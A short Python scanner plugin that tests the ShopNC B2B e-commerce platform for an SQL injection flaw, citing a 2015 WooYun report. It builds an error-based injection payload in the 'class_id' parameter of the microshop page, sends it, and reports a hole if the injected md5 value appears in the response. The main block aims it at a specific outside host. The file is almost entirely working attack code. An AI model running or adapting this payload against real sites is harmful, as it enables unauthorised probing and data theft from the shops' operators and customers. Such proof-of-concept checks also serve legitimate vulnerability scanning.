#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: shopNC B2B版SQL注入一枚
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0124172
#Author:xq17

def assign(service,arg):
    if service=="shopnc":
        return True,arg
    
def audit(arg):
    payload = "microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--"
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
        security_hole('find sql injection: ' + url)

                

if  __name__ == '__main__':
    from dummy import *
    audit(assign("shopnc","http://o.oular.com/")[1])